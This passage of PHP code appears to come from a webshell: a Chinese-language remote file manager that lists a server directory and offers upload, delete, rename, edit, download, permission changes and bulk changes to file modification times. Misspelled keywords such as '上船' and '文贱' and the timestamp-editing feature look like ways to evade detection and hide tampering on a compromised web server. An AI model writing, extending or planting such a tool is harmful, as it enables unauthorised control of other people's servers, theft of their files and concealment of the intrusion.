echo '<input type="button" onclick="$(\'upfrm\').submit();" value="上船" style="width:50px;"> ';
echo '上船重命名为 <input type="text" name="rename" style="width:128px;">';
echo '</form></div>';
echo '<form name="frm1" id="frm1" method="POST"><table class="tables">';
echo '<input type="hidden" name="rsv_t" id="rsv_t" value="'.$nowdir.'">';
echo '<input type="hidden" name="act" id="act" value="">';
echo '<input type="hidden" name="var" id="var" value="">';
echo '<th><a href="javascript:cd(\''.dirname($nowdir).'/\');">上级目录</a></th><th style="width:8%">操作</th><th style="width:5%">属性</th><th style="width:17%">创建时间</th><th style="width:17%">修改时间</th><th style="width:8%">下载</th>';
if($array) {
	asort($array['dir']);
	asort($array['file']);
	$dnum = $fnum = 0;
	foreach($array['dir'] as $path => $name) {
		$prem = substr(decoct(fileperms($path)),-4);
		$ctime = date('Y-m-d H:i:s',filectime($path));
		$mtime = date('Y-m-d H:i:s',filemtime($path));
		echo '<tr>';
		echo '<td><a href="javascript:cd(\''.$nowdir.$name.'\');"><b>'.strtr($name,array('%27' => '\'','%22' => '"')).'</b></a></td>';
		echo '<td><a href="javascript:dels(\''.$name.'\');">删</a> ';
		echo '<a href="javascript:acts(\''.$name.'\',\'rf\',\''.$name.'\');">重命名</a></td>';
		echo '<td><a href="javascript:acts(\''.$prem.'\',\'pd\',\''.$name.'\');">'.$prem.'</a></td>';
		echo '<td>'.$ctime.'</td>';
		echo '<td>'.$mtime.'</td>';
		echo '<td>-</td>';
		echo '</tr>';
		$dnum++;
	}
	foreach($array['file'] as $path => $name) {
		$prem = substr(decoct(fileperms($path)),-4);
		$ctime = date('Y-m-d H:i:s',filectime($path));
		$mtime = date('Y-m-d H:i:s',filemtime($path));
		$size = size(filesize($path));
		echo '<tr>';
		echo '<td><input type="checkbox" name="files[]" value="'.$name.'"><a target="_blank" href="'.$thisurl.$name.'">'.strtr($name,array('%27' => '\'','%22' => '"')).'</a></td>';
		echo '<td><a href="javascript:go(\'edit\',\''.$name.'\');">编辑</a> ';
		echo '<a href="javascript:acts(\''.$name.'\',\'rf\',\''.$name.'\');">重命名</a></td>';
		echo '<td><a href="javascript:acts(\''.$prem.'\',\'pd\',\''.$name.'\');">'.$prem.'</a></td>';
		echo '<td>'.$ctime.'</td>';
		echo '<td>'.$mtime.'</td>';
		echo '<td align="right"><a href="javascript:go(\'down\',\''.$name.'\');">'.$size.'</a></td>';
		echo '</tr>';
		$fnum++;
	}
}
unset($array);
echo '</table>';
echo '<div class="actall" style="text-align:left;">';
echo '<input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> ';
echo '<input type="button" value="复制" style="width:50px;" onclick=\'txts("复制路径","'.$nowdir.'","a");\'> ';
echo '<input type="button" value="删" style="width:50px;" onclick=\'dels("b");\'> ';
echo '<input type="button" value="属性" style="width:50px;" onclick=\'txts("属性值","0666","c");\'> ';
echo '<input type="button" value="时间" style="width:50px;" onclick=\'txts("修改时间","'.$mtime.'","d");\'> ';
echo '目录['.$dnum.'] - 文贱['.$fnum.'] - 属性['.$chmod.']</div></form>';
break;
}
?>